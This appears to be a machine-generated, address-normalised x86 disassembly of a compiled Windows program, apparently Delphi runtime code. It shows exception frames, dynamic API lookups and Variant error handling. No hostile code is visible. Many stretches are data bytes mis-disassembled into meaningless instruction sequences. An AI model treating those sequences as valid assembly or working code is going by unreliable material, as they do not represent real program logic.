and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d49d
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_40d4a8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d502
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041e4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40ab5c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d509
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_40d514
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d56e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_4041e4
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409370
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d575
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_40d580
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40d5ed
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4041e4
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_408110
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5f4
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
sub_40d600
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d660
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4092cc
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404788
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d667
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_40d670
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d6d0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a31c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404788
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d6d7
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_40d6e0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d744
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4081ac
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404788
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d74b
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_40d774
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40d7a0
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d310
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d340
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d340
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d34c
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d34c
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d34c
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d34c
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d34c
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d34c
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d34c
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d34c
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d34c
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d358
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d364
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3d0
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d43c
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d4a8
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d514
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d580
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d600
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d670
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6e0
mov eax r-xdata
call sub_40d774
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40daac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40dad1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dad8
retn
sub_40dc0c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
fadd [ eax ]
or al 0x0
add [ eax ] al
mov al 0x75
inc eax
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ esi ] dl
inc ebp
push esi
popad
jb r-xdata
jo r-xdata
popad
outsb
je r-xdata
insb
outsd
ja r-xdata
inc ebx
popad
jae r-xdata
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
outsb
jbe r-xdata
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ edi ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040dd ] al
add [ eax ] al
add [ eax + 0x54004075 ] dh
xor al 0x40
inc ebp
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xdd
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov al 0x75
inc eax
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
outsd
jb r-xdata
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb ch 0x40
add [ eax + eax ] cl
add [ eax ] al
mov al 0x75
inc eax
add [ esp + esi + 0x40 ] dl
outsd
jb r-xdata
sbb ch 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jb r-xdata
mov eax 0x40dc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040dc ] bh
adc eax 0x72615645
jns r-xdata
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
outsb
jbe r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
outsb
je r-xdata
rol [ eax + 0x40dd ] 0x0
add [ eax ] al
add [ eax ] al
rcr [ ebx * 8 + 0x40 ] 0x0
add [ eax ] al
jb r-xdata
popad
outsb
je r-xdata
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
xor al 0x40
inc eax
add [ edx + esi ] dl
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx * 8 + 0xc0040 ] bl
add [ eax ] al
mov al 0x75
inc eax
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
jb r-xdata
add [ eax ] al
add [ eax + 0x54004075 ] dh
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc0040dc
add [ eax ] al
lea eax [ eax ]
push esp
fadd [ eax ]
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xdf
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
fiadd [ eax ]
or al 0x0
outsd
jb r-xdata
inc ebp
push esi
popad
jb r-xdata
xor al [ eax ]
pop ss
fld [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
jb r-xdata
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
jb r-xdata
outsb
je r-xdata
popad
add [ eax ] al
mov al 0x75
inc eax
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
shr [ esi + ebx * 8 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebx * 8 + 0xc0040 ] ch
xor al [ eax ]
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ 0x72615645 ] dl
fiadd [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
fiadd [ eax ]
or al 0x0
add [ eax ] al
mov al 0x75
inc eax
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
outsd
jb r-xdata
mov esp 0xd8004031
xor [ eax ] eax
adc al 0x32
outsd
inc eax
add al ah
popad
jb r-xdata
popad
jns r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
insd
fild [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ eax + eax ] cl
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
jb r-xdata
add [ eax ] al
mov al 0x75
inc eax
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ eax ] al
jb r-xdata
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ edx + esi ] dl
outsb
js r-xdata
xor al 0x40
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add [ edi + ebx * 8 + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 8 + 0x40 ] bh
add [ eax + eax ] cl
add [ eax ] al
mov al 0x75
inc eax
add [ esp + esi + 0x40 ] dl
outsd
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
lodsb [ esi ]
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax - 0x20 ] cl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov al 0x75
inc eax
add [ esp + esi + 0x40 ] dl
inc eax
add [ edi + ebx * 8 ] dl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx * 8 ] dl
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e115
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
push sub_40e1a7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40fe08
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40fe08
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e1ae
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f80
retn
dec ebp
in al 0x8b
mov ebx eax
popad
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add al bl
xor [ eax ] eax
adc al 0x32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040 ] ch
add [ eax ] al
mov al 0x75
inc eax
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
fild [ eax ]
or al 0x0
outsd
push 0x0
xor eax eax
push ebp
push sub_40e10e
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x20 ] cl
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov al 0x75
inc eax
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
loopne r-xdata
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
sub_40e0c4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e10e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e115
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_40e118
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e1a7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40fe08
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40fe08
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e1ae
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f80
retn
sub_40e1b4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e1fe
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e205
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_40e208
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e297
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40fe08
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40fe08
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e29e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f80
retn
sub_40e2a4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e2ee
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e2f5
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_40e2f8
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40e53d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e544
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f80
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403f80
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
jmp r-xdata
dec eax
je r-xdata
call sub_40e0c4
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
jmp r-xdata
jmp r-xdata
call sub_40e1b4
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40abe8
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
call sub_403998
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
jmp r-xdata
jmp r-xdata
sub_40e558
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e118
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e208
jmp r-xdata
jmp r-xdata
call sub_40e2f8
sub_40e58c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e5d6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e5dd
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_40e5f4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e624
push ebp
mov ebp esp
push ebx
